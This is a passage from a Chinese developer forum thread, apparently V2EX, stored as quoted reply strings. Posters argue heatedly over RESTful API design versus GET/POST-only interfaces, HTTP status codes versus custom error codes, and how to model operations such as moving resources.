而这完全看团队风格或者个人风格了， 所以不要在这上面总是纠结谁好谁坏了，这两个都是平等的，完全可以自己设计一套适合自己的 \"RESTful\"", " \r", "\r", "请你明确指出我说了哪些 RESTful 的好处，然后也符合你说的后端框架也可以实现的。\r", "\r", "不过，退一万步来说。 \r", "RESTful 肯定不是蝎子拉屎独一份，但它是一个基于 RFC 的、有多种开源实现的规范。\r", "我从来不反对谁谁用自己定制的协议和框架，\r", "我只是讨厌那些对 RESTful 一知半解对 RESTful 的风格选择性遵守然后又把脏水倒到 RESTful 身上。\r", "\r", "我想强调的是，如果你想清楚了，你怎么设计都可以。\r", "如果你没有想清楚 ，多参考 RESTful 的设计以及这个设计是解决了哪些问题（很多人就是不理解 这些设计就来吐槽）\r", "最后，如果你很懒，不想想那么多，那么直接按照 RESTful 规范来做，就是最省事的（很多人就是做到一半以为自己比 RESTful 高明又玩自己的一套）\r", "\r", "这些人里面，国内程序员尤为严重，什么反范式啊反权威这样的话都说出来了。\r", "好像他们自己的不幸就是他们口中的这些范式啊权威啊导致似的。", "个人觉得， Restful 只是一个参考而已。。实际应用中还有很多问题，前后端调用只是一部分，涉及到微服务调用上情况会更复杂，举个 404 异常例子：\r", "前后端分离情况：足够描述资源找不到的问题，对用户来说不管什么问题，都是没找到资源而已。\r", "微服务架构：完全不够，造成 404 的问题，有可能是没有部署这个接口，也可能是负载均衡有问题，也可能是真的没这个资源，还有可能是参数组合有问题（也可以用 400 描述，但是 400 情况同样，具体不到哪个参数有问题）。\r", "所以说， restful 只是一个风格而已，未必要完全一样，在 RPC 里很容易解决的问题，在 http 上可能有很多问题，不管是 ice ， thrift ， dubbo 可以定义大量的异常，同时不需要修改数据结构，但是到 http/restful ，没有异常这个概念，是需要定义量的错误码，还是复用原有的 http status ，我个人觉得还是自定义统一的错误体系会更好", " \r", "\r", "首先，如果是负载均衡有问题，你们确定是返回 404 吗？\r", "按我的经验，如果负载均衡是 Nginx 做的话，应该会是 503 或者 504 ， 明确指出了这是服务端的问题。\r", "如果是客户端方面得到了错的 URL 那么 就是 4XX 可能是  404 也可能是 405.\r", "HTTP 的状态码本身就明确区分了责任方。\r", "\r", "第二， RESTful 并不拒绝自定义错误码，只是必须要与 HTTP 状态码意义不冲突\r", "事实上 AWS GCE 的 RESTful API 文档里面也定义了大量的自定义错误码。\r", "习惯的做法是用 Json Envelope ，将适用的真正要返回的数据封装在一个公共知晓的结构里面。\r", "怎么可以说 RESTful 没有异常的概念呢？\r", "\r", "请确定你有了解清楚 RESTful 的内容，例如本贴中 #39 给出了一个不错的参考来源,其中就有提到：\r", "“ Don't use an envelope by default, but make it possible when needed ”\r", "\r", "这怎么能说它不支持异常呢？\r", "讲道理的话， 3XX ， 4XX  5XX 都能算作是异常。", " \r", "我说的负载的问题是，如果你用 nginx 的时候，如果 ng 配置有误，会返回 404 。\r", "\r", "如果是服务调用方的失误（写错接口，复数多 s 少 s 很正常）或者服务提供方修改了接口定义（实际遇到过，手误在写接口名时，敲 ctrl+s 未成功，直接写出一个 s 而不自知，单元测试不通过 http 调用，未测出来）出现 404 是没有办法和业务状态的 404 所区分，特别是服务更新或者出现问题，很难定位是部署出现问题还是业务本身问题，运维和开发如果分离的情况更复杂。\r", "\r", "如果使用 json envelop 的话，实际上就是自定义错误体系，区分了 http 状态和业务状态。\r", "\r", "宽泛的说错误码和异常的作用可以等同，但是上文特指 Exception ，请勿偷换概念", " \r", "\r", "这种 NG 配置错误的问题，要影响服务 API 设计工作吗？很难发现或者测出来吗？\r", "单元测试 RESTful 接口不通过 HTTP 调用……请问你们是怎么测？\r", "如果上司让你们因为这些低级错误改设计的话那你换公司好了。\r", "\r", "我再重申一下观点， RESTful 是工作在 HTTP 之上的，而且是与业务具体相关的协议\r", "所以肯定是有 HTTP 状态和业务状态两个概念。\r", "当然错误码也会有 HTTP 错误码 和 业务专有错误码，\r", "HTTP 错误码是为工作在 HTTP 层的各路非业务设备看的\r", "业务专有错误码是工作在业务端的，两者只要不含有意义冲突的定义。\r", "\r", "转帖一下大厂怎么设计 RESTful 错误码\r", "\r", "\r", " \r", "\r", "你的回复居然获得了一个赞，我很嫉妒，所以我再提供多一个简单的测试方法好了。\r", "如果你想知道 404 是谁搞出来的。\r", "curl -i 就可以看到是哪个服务器发出来的响应了。\r", "真心不理解为什么会难测难发现。", " 那一个赞是我给的，你给出的两个大厂的例子明明就是自定义错误体系，怎么就变成了你宣扬的通过 HTTP STATUS CODE 来定义错误了，你不要偷换概念好嘛", " \r", "\r", "请问我偷换了什么概念？\r", "\r", "\r", "这是 AWS 的：\r", "\r", "REST Error Responses\r", "\r", "When there is an error, the header information contains:\r", "\r", "* Content-Type: application/xml\r", "* An appropriate 3xx, 4xx, or 5xx HTTP status code\r", "\r", "The body or the response also contains information about the error. The following sample error response shows the structure of response elements common to all REST error responses.\r", "\r", "\r", "这是 google 的：\r", "\r", "\r", "The Drive API returns two levels of error information:\r", "\r", "HTTP error codes and messages in the header\r", "A JSON object in the response body with additional details that can help you determine how to handle the error.\r", "The rest of this page provides a reference of Drive errors, with some guidance on how to handle them in your app.\r", "\r", "\r", "难道我在 #115 表达的不是这个意思？", "  知道你是这种水平之后，我也不稀罕你的赞了。", " 嗨呀，我难得认真一次，下面的回答我从第一页看过来的，你自己回去看看你 50 楼以前的回复怎么说的\r", "\r", "      还有，你在 RESTful 规范不适合的时候强行用，借用其他“奇怪的技巧”？，我不得不说你这个 RESTful 不怎么 RESTful 啊\r", "      我水平太次，你技术大牛，你去安利你的 RESTful 风格吧，我继续用我的 GET,POST ，不知道做微信接口的同行看到了会不会自惭形愧，居然没有学习大厂用 RESTful\r", " ", " ", " \r", "\r", "反正 v2 上发了帖就改不了。你愿意指出具体问题你就说，不想认真就别回。\r", "\r", "你要说 RESTful 规范不适合的时候强行用，真是好笑了——我做了什么 RESTful 的系统，又是怎么不适合的？\r", "或者我举了哪个例子，让你觉得 RESTful 不合适？\r", "怎么不合适你又不说，不好意思，不是你女朋友你老婆，我不负责体贴你。\r", "\r", "既然我举的例子你不服，觉得微信是王道，你说出个微信的道理来，有没有理大家评评嘛。\r", "\r", "觉得说不过、不值得提前撤，也是可以的。\r", "接受我的奚落就是了。", " \r", "本来我是不想回的，因为这种脱离生产的为辩论而去做辩论，没有特别的意义。但是看到你这么酸的。。。。。\r", "\r", "我从主贴上看到您是驳斥这种 Json Envelope ，你希望通过只处理 http 头来解决问题。。。但是后续又提出“ HTTP 错误码是为工作在 HTTP 层的各路非业务设备看的 ”，那我的理解就是关于资源有无，应该是业务层，而非 HTTP 层的。。所以真心不知道你是什么观点。\r", "至于你说的：“ curl -i 就可以看到是哪个服务器发出来的响应了。 ”\r", "我觉得没问题，能解决问题，但是，如果不用这些方法，只是通过日志直接能判断服务的问题，这样的效率不是更高，只是为了遵循某个规范，而搭进去排查运维、开发的人力和时间成本毫无意义。\r", "\r", "至于你提的 2 大厂。。。只是代表了一种设计思想（错误码和 json 同时使用），但是并非强制标准抑或其他。\r", "\r", "\r", "国内几大厂以及主推微服务架构的 Netflix ，则推行的则是 HTTP 状态只负责链路层，业务错误由另外结构体处理。\r", "从 spring-cloud-feign 上来看，目前的方案是：非 200 的错误的处理方案是统一的 errorDecode ，也就是非 200 由处理链路层的方法去统一管理。\r", "\r", "所以说不管方案是不是纯血的 Restful ，贴近生产，符合实际，能提高劳动效率的方案才有意义吧。", " \r", "\r", "我知道你为什么会这么理解我的观点了。\r", "\r", "明确一下我的观点：\r", "0. 我反对只用 GET POST\r", "1. 如果只用 GET POST ，那么 GET 一个资源 ID 错了的时候用 404 会有歧义\r", "2. 如果不希望客户端错误理解 404 （并且将错就错），那么返回 200 和 一个 JSON 应该是可行的做法\r", "3. 可是这样就必须强迫客户端总是要解析 JSON ，并且如果真的是资源不存在的时候， HTTP 设备也无法知晓\r", "\r", "所以 3 就只用 GET POST 这种方式带来的隐忧，也因为如此我反对这种设计。", "做前端的，表示 RESTful 这个东西应该是为了前端方便而来的。你可以说它是风格，但我觉得 RESTful 作为不是硬性的“标准”可能更加适合，因为我肯定希望后端全部按照这套东西来写 api ，这样前端可以用 js 根据不同的 code 做相应的反馈，状态码都是固定现成的，一套 js 只需要稍作修改就可以用在其他地方\r", "\r", "create(post) - return 201 / 409\r", "delete(delete) - return 200 / 404\r", "edit(patch) - return 200 / 204 /404\r", "read(get) - return 200 / 404\r", "replace(put) - return 200 / 204 / 409\r", "\r", "这一套可以应付大多数情况了，而且 201/204/409 的使用显然比单纯用 200/404 来得人性化\r", "\r", "我看楼上有人举『移动到文件夹 X 』的例子，很明显这个已经超出了 RESTful 所定义的范畴，你强上 RESTful 肯定不合适，但比如你 增删改查 设计成符合 RESTful 的架构，然后其他的再自定义这完全 OK 啊", " 非常建议有空的时候真的看一下。 dhh 作为 Ruby on Rails 的设计者，很多思想都非常富有远见。而且他不像很多大牛一样是极端。他先介绍了 REST 风格到底给你带来了什么好处，也说了在什么情况下需要 make exception 。", " 第一啊，我并没有说你做的什么系统有什么问题，只是你自己前后矛盾而已\r", " 第二，可能你语文不太好，不能体会字面背后地意思，那我现在说清楚，不要为了 RESTful 而 RESTful ，要看实际情况来\r", "第三，微信的例子，就用我最近要用到的微信公众号接口来说吧，它也并没有采用 RESTful 风格，而是定义了一个确定的 JSON 结构，然而我感觉在你心目中微信根本不算什么，在你眼中，要每天百万级的接口调用才叫牛逼\r", "\r", "还是那句话，你开心就好，我真是闲得蛋疼\r", "\r", " ", "看看 fb 的 Graphql ，也是不错的一个解决方案", " ", "1. 前后什么内容什么观点矛盾了请指出。要不你看看 #123 是不是你自己误读了。说话说一半神惹人烦", "2. 什么实际情况请说明，别装 B ，说话说一半神惹人烦。", "3. 微信的接口确实没啥牛逼的。各家 sns 的 api 封装是我曾经做过的产品之一，各位写移动 app 调用的 sdk 可能有可能包含我的代码。所以我觉得我起码有调查过，你说它牛逼就因为它是微信？", " \r", "\r", "> 你一直在说 http api 调度代价大，事实上数据库访问的代价更大，连接数基本上都是有上限限制的。数据库的调用逻辑更是测了又测。我扩张几台几十台 http server 简直是简单得不要不要的。\r", "\r", "就算真的要用集群，就必须用 REST ？？呵呵。你们家 REST 还是跟集群绑定的？？\r", "\r", "REST 的发明者都没你这么强硬吧？？你是来布道的，但是大家的选择权也是很重要的。 REST 虽然优雅，但是我不喜欢就可以不用。", "终于扯到返回信息的处理了。。\r", "\r", " [按照 404 的语义，响应 404 是不对的： 因为客户端请求的 URL 实际上是正确的，只是对应的参数没有找到对应的结果 很多时候，就只能靠响应 200 然后返回空数据或者空对象来处理了。 ] \r", "\r", "你前面也说了，自定义错误码就能解决。（但是国内多数厂商提供的 API 是 200 + errmsg 这种方式，没你想象的这么简单）。\r", "\r", " [这样就会要求客户端，必须处理 HTTP 回复的具体内容，而不能只处理头部。] \r", "\r", "就算拿 HTTP 状态区分，对于成功的请求，还是要解析 JSON 的。反正 JSON 这块你绕不过去。\r", "\r", " [对于强类型语言例如 C/C++ OC Swift 写的客户端来说，恐怕就忍不住要问候服务端程序员一家了。] \r", "\r", "JSON 库的封装跟强不强类型没关系，跟是否存在反射有关系。 OC/Swift 的 Runtime 十分强大，所以把 JSON 变成对象是没问题的。\r", "\r", "至于 C/C++ 嘛，在互联网的服务端 /客户端中占得比重太少了，我设计个接口为啥要考虑它？？那我是不是还要考虑一下 Delphi 、 COBOL ？？", " \r", "\r", "谁强迫你了？谁布道了？\r", "我在批评乱改 RESTful 规范然后又搞出自以为高明的设计。\r", "\r", "选择权很重要？\r", "我们不聊政治，按需遵守规范就是降低效率浪费人力浪费金钱，我觉得这些比什么鸟什子选择权重要得多。", " \r", "\r", "你忽略了我上面那句话。\r", "\r", "mysql-cluster 是跟 REST 绑定的？？ redis-cluster 是跟 REST 绑定的？？ \r", "\r", "谁告诉你用集群就必须用 REST 了？？数据库连接背后就不能是集群？？", " \r", "\r", "我说了很多次，也贴了 Google Amazon 的做法，我不介意再重新说明一次我的观点：\r", "*** 自定义错误码是不够的，必须结合 HTTP STATUS ***\r", "\r", "而我帖子里面举的例子， GET POST 返回 200 然后 json 说有错这种做法，就是违背 HTTP 语义乱来的做法。\r", "情形就好像 TCP 里面明明发了 ACK 却想要对方重新发送一样鬼扯。\r", "\r", "“至于 C/C++ 嘛，在互联网的服务端 /客户端中占得比重太少了”\r", "当我说客户端的时候，你想到的是手机、浏览器；\r", "而我想到的还有 Proxy SERVER ， CDN Server\r", "你只关心业务，我关心的是整个网络上的机器。\r", "所以视野不同，结论不同。\r", "如果算上我说的，你还会认为“ C/C++ 在互联网的服务端 /客户端中占得比重太少”吗？", " \r", "\r", "0. 数据库机器比 HTTP SERVER 价格贵得多。\r", "\r", "1. 当我增加面向客户的机器时，如果这些机器是纯粹的 HTTP SERVER ，那我就不需要考虑调整数据库集群，但同时带来更好的处理 客户请求的响应性能。\r", "\r", "2. 如果这些 HTTP SERVER 我能确保它们实现业务的时候，正确理解和使用 HTTP STATUS 语义，例如 GET 是幂等的， 200 就肯定是成功，这样的语义，那我就能确信它们能降发挥 CDN 的作用降低数据库压力。\r", "\r", "3. 遵守 RESTful 的规范确保 这些 HTTP SERVER 能够满足 2.\r", "\r", "所以没错，事实就是这么直接，信不信由你，现行的标准里面 RESTful 在集群上就是这么有效果。", " 你找我要「优雅」的标准？哈哈，找错人了，这个词可不是我先说的哦，我只是顺着楼上某个人的思路向下走。", "```\r", "「如果你有的只是一個鎚子，那麼所有的東西看起來都像一個釘子」\r", "\r", "「把一個熟悉的技術或理念強迫的應用於大量的軟體問題上」的概念已經被認為是一種反模式，一種編程時應該避免的實踐\r", "```\r", "\r", "“不少程序员都是这么认为的”，第一句话，谁这么认为？", " @", " \r", "\r", "你看，我讨论问题的诚意在这里。\r", "我给出了一个例子，展开了这个例子，然后根据这个例子讲了我的看法。\r", "有人提出不同意见\r", "我反驳。\r", "\r", "而你们做了什么呢？\r", "只是在把一些看起来很有道理的话贴出来\r", "说了什么很有道理的话呢？\r", "“ XX 是好的，可是不是什么时候都是好的”\r", "“人是肯定会死的，但是不要急着去死。”\r", "\r", "不如我也送你一句话：\r", "解放思想，实事求是\r", "\r", "不用谢", "  我相信本帖种不少人表达了类似的意思，甚至说， GET 都不是必须的，有 POST 就够了。", "这是个找喷贴？？？", "秀优越 秀大神还是找喷?", "讲道理，我是来学习撕 b 技巧的。\r", "真的受教了。感恩各位大神。", " 妹子 可以约么。。。", " 拒绝。", "瞧你说的 HTTP 其实也不需要了\r", "\r", "直接 raw TCP 通信呗\r", "开头写上资源和动作 后面跟参数就行了呗", " 问个问题啊，在没有特定背景铺垫的情况下，直接论坛上看到个女的就约，有成功的可能性么？", "我咋看都觉得应该是 nginx rewrite 该干的事", " 👍", " 虎躯一震，王八之气一发，只要你说就有机会，不说，机会都没有，再说了，你不知道他是谁而已", " 积极乐观的精神真是让人欣赏。。。原来真的有人这么想的。。。\r", "受教了，谢谢啊", " 嘲讽么。。", " 怎么会，只是经常看到类似现象，有点好奇是不是真的可以约到罢了", " ", "讲道理的话，我这种撕的手段只能在 v2 生存。因为这里的立场是讲有帮助的内容。", "遇到像你这样的回复，我肯定没招。完全是天外飞仙的歪楼，而在别处不一定属于禁手。", " 你有酒么。其实不能， but....这妹子我肯定能约上。", " \r", "\r", "不不不，您误会了，先跟你道个歉。这里不是来歪楼的，确实是表达敬意。只是可能态度不太端正。\r", "\r", "事实上我是做品牌的，您的回复全程我都有关注。\r", "\r", "虽然内容准确与否有待商榷，毕竟是争议性话题，而且大家各有立场，无法说出个绝对正义。但是您的回复，非常精彩，公关级的撕逼。除了有几楼稍微过激之外，真的是很厉害。\r", "----------------------------------------------------------------------------------------\r", "顺便回复 @", "  小伙伴，悄悄跟你说，别说论坛了，我曾经认识过一个妹子还能在淘宝约。。平台不重要，重要的是你想不想约。。想约就总有上钩的人的。。。", " \r", "\r", "那兩句話只是想提醒自己，不要再犯同樣的錯誤。\r", "\r", "兩年前看到 Restful 的設計方式後，真的覺得自己撿到了一塊寶，興奮地和當時合作的後端介紹它的規範和理念，然後討論著該如何導入之後的項目裡。\r", "\r", "但以結果來說我錯在太堅持，全部依賴 Restful 設計原則，導致任何需求必須把它捏成 Restful 能夠接受的樣子，還得告訴自己 Restful 果然很棒，什麼都做得到。\r", "\r", "「當時的我們就像拿著鎚子的小孩，所有的東西都想拿鎚子來敲。」\r", "\r", "Restful 可以解決大部分的需求，我同意，\r", "但不是所有需求都得用 Restful 解，即使它做得到。\r", "\r", "離題了，\r", "但這是那兩句話的原意。", " 谢谢来自妹子圈的实例，我的世界观又可以刷新升级了。\r", "话说淘宝那个，妹子主动约应该比较简单吧。\r", "\r", "------------------------------------------------------------\r", " 这么有信心，其实你俩本身就是好 CP 吧？", " 事实就是 当你用如果是纯粹的 xxxx 来考虑，就违背了现实因素。我还纯粹数据库呢。。要你这有何用", "这帖子太精彩了，忍不住冒个泡", "Restful 只是 http 这一层面的~\r", "客户端浏览器使用 restful ，或服务端使用 restful ，模板都是解决工程问题。\r", "服务端调用其他系统的借口，当然还是习惯 RPC 和 Thrift~", "其实从模块儿设计的思想来说\r", "restful 是符合 高内聚，低耦合 的\r", "\r", "就拿 lz 的例子来说， url 分发的模块和逻辑处理的模块应该尽可能的分开，你设计了 add del modify and so on ，但是业务逻辑更多的时候呢，需要修改的时候怎么办？从 url 到逻辑代码都要修改。\r", "\r", "采用 restful 的方法，都到一个地址\r", "后端的人想怎么写就怎么写，不同的人写不同的模块，都处理 json 就行了。功能增加，功能修改都只需要改后台逻辑部分就行了\r", "\r", "最开始做东西 就按 lz 的思路做的，每一个操作都一个 url ，工作量非常大！后来了解到 restful ，简直是艺术", "搞错 lz 观点 尴尬😅", "然而大部分后台开发人员都不按照这个来，几乎都只有 post 和 get 。", "RESTful 是一种针对互联网应用系统的架构风格（ architectural style ），有非常明确的应用场景及要求。\r", "REST 化对系统性能、灵活性、统一接口、移植性、可靠性等方面都有好处。\r", "\r", "如果不以系统架构（客户端、服务端）的角度考虑问题，只考虑服务端内部如何方便实现，不考虑客户端，是没办法理解为什么要 RESTful 的。\r", "\r", "反对的，也应该拿出点干货。\r", "有些根本就不知道 RESTful 的目的。", "第一 如果一定要使用一个一定是 post ，而不是 get ，所以精简一些 post 就足够了。\r", "\r", "第二如果你觉得 get and post 对你同意重要，那么你肯定需要 put delete and option 。包括 resource 和幂等在内的一些概念真的很棒！\r", "\r", "最后国内有太多伪 RESTFUL ，合作过一些大项目出来的 a or i 工程师简单粗暴的觉得 post 可以代替 put 也是醉了", "百万级别的 api 调用次数很多？/手动 AC 扇子脸", "post 同样可以理解为向服务器传递消息，通过参数来说明动作\r", "实际上，普通的带参数 get/post 单个请求能完成的 不应用 restful 多次请求增加负担\r", "优雅是一方面 负载同样重要", " \r", "\r", "不明白为什么 RESTful 对你来说居然是代表着多次请求才能完成普通 HTTP 请求。\r", "或许你就是哪种又不懂又要（有意或无意地）泼脏水的\r", "果然无知就是罪恶啊。", " 指的 move copy 等请求", "  \r", "\r", "我只是举了在我那个系统里面的做法为例子，并且是针对带有事务性质的要求，用基本动作的组合来描述一个事务。\r", "没有人说过 RESTful 语义做那种看起来是多个请求组合的方式就真的一定要发多个请求。\r", "既然你可以说的出“ move copy 等请求”\r", "想必用 RESTful 语义 POST a move POST a copy 也不是什么难题吧？", " 抱歉啊，你又找错人了。\r", "你应该找一开始说「只是要优雅」的人去要优雅的定义，毕竟这句空话是他先说的。而且，我看你好像还回复了他来表达赞同，所以我相信你知道我说的是谁。\r", "\r", "邮件的例子，你举是举了，然而却搞出一堆什么事务啊队列啊之类的东西，越搞越复杂。如果不用 REST ，就是传一个自定义动词 move 的事情，显然比 REST 更优雅。", "手里拿着锤子，看什么都是钉子。\r", "殊不知排钉得用气钉枪打，用锤子只会把它锤弯。", " \r", "\r", "那是因为我给了一把索尔的锤子。当然可以把所有东西当钉子了咯。\r", "事务和队列确实是业务需求，跟 RESTful 无关。\r", "因为你不知道实际上我做的事情是用 json 做了一个 DSL 来描述事务。\r", "这的确跟 RESTful 没有直接的关系。\r", "但如果不是 RESTful 的方式解构所有资源操作，你根本就不可能像我那样用 JSON 来描述所有的事务动作。\r", "你必须一个一个事务地去实现而不是像我写的那个系统那样，把要做的事务交给调用者来定义。\r", "跟你们这些靠勤奋的锤子比，我都不好意思了。", " 你看，你这样不就是不优雅吗——对于前端而言，事务的概念本应是不可见的，而你却为了遵守 REST 强行把锅甩了。", " 我来指出你思考问题过程中的一些缺陷请你不要介意：\r", "\r", "1. 为什么“对于前端而言，事务的概念本应是不可见的”？ 这是一定的吗？ 这是业务决定的，还是只是你的信念？如果事务是客观存在的，前端可以有什么办法视而不见吗？\r", "\r", "2. 即使 ““对于前端而言，事务的概念本应是不可见的” 是成立的， RESTful API  就做不到让前端不觉察事务的存在吗？\r", "\r", "3. “甩锅”这种事情，请问跟是否 RESTful 的关系是什么？难道你认为，假如有人想把锅甩给服务端，服务端可以用 要遵守 RESTful 来拒绝吗？\r", "\r", "你看，你的论点基于很多你个人的经验和没经过深入思考的假设。\r", "\r", "没错，如果遇到你这样的同事，我就可以墙裂推荐 RESTful 来甩锅，毕竟写 RESTful 规范的人比你牛逼。\r", "有本事你也写个规范出来让大家讨论讨论，光坐在一旁拆台不体具体建议，这种事情也不是特别难做吧。", " \r", "\r", "1. 首先现在为什么前后端分离是趋势？那就是因为前端本应只考虑对资源之操作的动作，而不应考虑操作的实现细节。事务的概念已经属于实现细节了，因此不是前端该考虑的。\r", "\r", "2. RESTful 的 API 只有四个动词，所以对于动作的描述能力极其有限。\r", "\r", "3. 为了在不方便遵守 RESTful 的地方遵守 RESTful(请注意这个前提)而拒绝实现某种方法，称为甩锅的确不准确，应该直接称之为设计缺陷(这个词针对 API 而不是针对 RESTful)。\r", "在上面的例子中，对邮件的操作你可以放一个事务，里面的细节是删除再新增，那么如果是对一个几 GB 的对象的操作呢？", " 至于我设计的 API 风格肯定没有 REST 的牛之类的话语，这属于转移话题。原本在讨论 REST 风格好不好，你却转移到我设计得好不好。", " \r", "\r", "1. 请问新浪微博 API  Twitter API Facebook API 这些，前后端分离在哪里？他们是不是 RESTful ？\r", "再强调一遍。前端不行是前端的事；前后端分离是前后端分离的事；前后端分离之后如果有事务，即使不用 RESTful 前端一样要有事务的概念。 RESTful 能解决这些问题，但并不是只解决这些问题，你拿这些来说 RESTful 不行是因为 你不行。\r", "\r", "2. 可是使用 RESTful 的人可以有无数种抽象出资源的方式。显然你不行，所以你用不了 RESTful 。\r", "\r", "3. 删除 GB 级别的操作又怎么样。你写代码的时候，知道有异步操作，知道可以用 Promise 或者 Task ，怎么在设计 RESTful API 的时候就不懂设计 Promise 或者 Task 资源？ 这是你蠢还是 RESTful 蠢？", " \r", "\r", "说你只懂拆台不懂具体建议，是因为 RESTful 有现成的例子所以你可以发出数不尽的批评而不需要意识到自己的不足。\r", "\r", "我之前已经说过了，只要你想清楚了，你可以再做一份自认为比 RESTful 更好的规范。如果没有， RESTful 本身是一套很好的规范。从上下文来看，你批评 RESTful 的地方恰恰都是你没有想清楚的地方。\r", "\r", "没错，我是想转移话题——你还没够资格批评 RESTful 哪里不好，或者没有到点上。", " \r", "\r", "1. 如果不用 RESTful ，前端可只考慮不可分割的「動作」之概念。每個「動作」對於前端而言都是原子性的。\r", "\r", "2. 既然事務也可以抽象成資源，那何不把整個 API 改成這樣：原始的資源能 GET ，其他對資源的操作皆 POST 至 /transaction 。這樣不還是只需要 GET 、 POST ，不需要 PUT 、 DELETE 。反正事務也是一種抽象的資源，這很 RESTful 啊~\r", "\r", "3. \r", "> 删除 GB 级别的操作又怎么样\r", "我說的不是刪除，是移動。難道你移動一個幾 GB 的對象時，是先刪除它然後再於其他位置創建？難道為了套 REST ，是可以連效率都捨棄的？", " 請先證明「自身水平沒有欲批評的對象高，便無資格作批評」這個命題。", "  说你不够资格并不是否定你评论的权利，只是想让大家以及你确定，是否在浪费时间。然而现在看来你确实是浪费时间。\r", "\r", "1 你当然可以设计这样的规范，并且或许已经有这样的实现。但是并没有普及。我已强调过了，有现成的规范你不妨介绍给大家。\r", "但是，“动作”本身就是业务的一部分。如果真的有这么一份规范，并且每个动作都形成具体的规定，我预感它要遵守的规范也好习惯也好不比 HTTP 动作简单。\r", "再者，”动作“本身是不是一定要有原子性语义，这还是业务决定的。所以你的提议听起来感觉就很临时。\r", "\r", "2. CRUD 是普遍存在的需要。把 CUD 三类请求放在了 POST 里面不是不可以，但这样你又必须把动作写在业务代码里面，既然这样，为什么不直接用 HTTP 语义？\r", "再往深了说，非纯函数式编程的语言里面，哪个语言没有这个过程：定义符号（变量）-> 读取／修改符号（变量） ->  符号（变量）离开作用域。 POST GET PUT DELETE  恰好就是这个过程的对应。换句话说，遵守 RESTful 规范，你的系统潜在地拥有了一个描述符号演算系统的能力，这比你什么鬼“动作”有根据多了。\r", "\r", "3.  脱离业务实现谈效率是扯淡。\r", "\r", "“自身水平沒有欲批評的對象高，便無資格作批評”\r", "\r", "不解释。", " \r", "\r", "2. 你理解错了，我举这个例子只是为了讽刺你这这种「能用那四个动词描述的就用那四个动词，不能的就视作事务」之做法。\r", "既然依你所言，事务可以视为资源，同时又有一切操作都可以被事务包括之前提，那么 API 便设计成甚至只用 POST 都可以，而且这还能同时遵守 REST ——这才是我想表达的讽刺语义。\r", "\r", "3. 我举出例子来说明用 DELETE+POST 来实现 Move 动作的荒谬性，本身就是为了指出你脱离具体业务之错误。", " ", "你非要认为移动是特殊的动作。业务许可的话，难道就不能一个 Put 或者 Patch 请求解决么。把资源的位置视作一种扩展属性，这样不 RESTful 么？这根本不是什么本质上的缺陷。", "我已经解释过了，有很多种抽象的方式和角度，但是 RESTful 大多可以满足。要做成事务还是两个请求还是一个请求，看具体需要。视乎系统怎么设计有什么需求。", "你非要用你死板而缺乏想象力的方式来想象我使用 RESTful 的方式，我只能认为这是不断给我打你脸的机会。", " \r", "\r", "2. 这当然很 RESTful ——我前面已经讲了。我是指出，这种方式和其他只使用 GET/POST 的 API 风格并没有本质上的区别。\r", "\r", "3. 终于改口了啊，现在你说「 RESTful 大多可以满足」。可之前你说的却是「除了无限的东西外其他东西都可以抽象成资源」「抽象不成是你水平低」。\r", "我本来就在强调看需求，不顾需求强行 REST 的人是你。\r", "\r", "我死板地想象，这我千真万确地承认，所以建议你不如明白地解释解释，你是怎么用包含「删除+重新创建」的事务「移动」一个几 GB 的资源的。", " 请问如果把资源的位置视为扩展属性，用 PUT 一个 Patch 来解决移动操作，就不需要专门实现一下吗？别跟我说你内部还是用「删除+创建」来处理的。", " \r", "\r", "2. “用 PUT 或者 PATCH ” 当然和 “用 GET / POST ” 有本质的区别。\r", "\r", "我肯定你只是一直在 blah blah blah 而没有看到过我前面说过的区别，区别在于：如果 PUT 或者 PATCH 失败了，你可以通过 HTTP STATUS 知道是资源不存在还是 API 调用有错误，但你只用 GET ／ POST 没法保证只需在 HTTP 层解析就知道是什么错误。\r", "\r", "这个问题就好像你调用 int GetNumber() 这样的接口，如果返回 -1 你无法判断这是一个错误还是一个结果。\r", "而现代的做法应该是类似于  Either<int, Error> GetNumber() .\r", "\r", "你要说前者足够你的业务使用就算了，这没问题，你喜欢就好。\r", "但非要指责抽象形式 Either<int, Error> 是死板，我只能说这是井底之蛙夏虫语冰。\r", "\r", "3. 你倒是找一个 RESTful 做不出来的需求啊…… 抓文字游戏胜利了显得你很聪明？\r", "\r", "“ PUT 一个 PATCH ” 这种说法让我发现回答你真是浪费时间，原来你连 RESTful 除了 PUT 之外还有 PATCH 都不清楚啊……\r", "\r", "你觉得你还好意思跟我 讨论 RESTful 不行么？ \r", "自己去看吧，不用谢：  ", "\r", "\r", "移动一个资源怎么用 PATCH ？简单:\r", "\r", "PATCH  .../HugeResource/1234567\r", "\r", "{\"oldPath\": \"../old/path/to/resource\",\r", " \"newPath\": \"../new/path/to/resource\"\r", "}\r", "\r", "不改变资源的物理位置，改变资源挂载位置，这是不是移动？嗯？\r", "\r", "我都说了，只要你的业务可以设计成这样，就可以支持这样的操作，跟 RESTful 一点关系都没有\r", "难道你只会用 cp 和 rm 不知道有 mount ？", " \r", "2. 类比错误。\r", "用 HTTP StatusCode 来表示错误才是相当于 int GetNumber() ，且用返回之负数的值来区分错误。\r", "<int, Error> GetNumber() 则是类似于返回 json 来描述错误。\r", "\r", "3. 哈哈哈哈哈哈哈哈哈哈哈哈 REST 提出之后十年才有 HTTP PATCH 方法呢……\r", "\r", "你看，你为了套 REST ，你又要特意增加一个「挂载位置」的概念。为了区分物理位置和挂载位置，整套系统的复杂度就增加了。况且在意义上，这和专门实现一个 move 动作有区别吗？哦，我是指「是否符合 REST 之外的区别」。", " \r", "\r", "1. 不明白为什么是“类比错误”。\r", "\r", "为什么你认为 “用 HTTP StatusCode 来表示错误才是相当于 int GetNumber() ，且用返回之负数的值来区分错误。”\r", "以及“ <int, Error> GetNumber() 则是类似于返回 json 来描述错误”？\r", "\r", "没说理由，你太着急反驳我了吧。\r", "\r", "\r", "2. 你既然有“移动资源位置” 的概念，那肯定本身就有“资源存储位置” 的概念，或者“资源挂载位置” 的概念，两者之少有一个。\r", "\r", "所以不存在你说的，“为了套 REST ，你又要特意增加一个「挂载位置」的概念”。\r", "不知道你有什么好装 B 的。\r", "\r", "\r", "* 针对只有“资源存储位置”概念的系统 -> 做成事务封装两个请，求或者直接发送两个请求，或者再包一层 API 来决定要用哪种方式\r", "\r", "总之，物理上改变资源存储位置肯定是两个， API 形式上是一个调用，只不过是选择不让人看到这个事实 ；暴露两个原子的调用接口的 API 设计选择，是选择让调用者知道更多。\r", "\r", "这只是一种口味问题，你把这种问题偏离到 “套用 REST ” 只能说明你根本没仔细想过。\r", "\r", "* 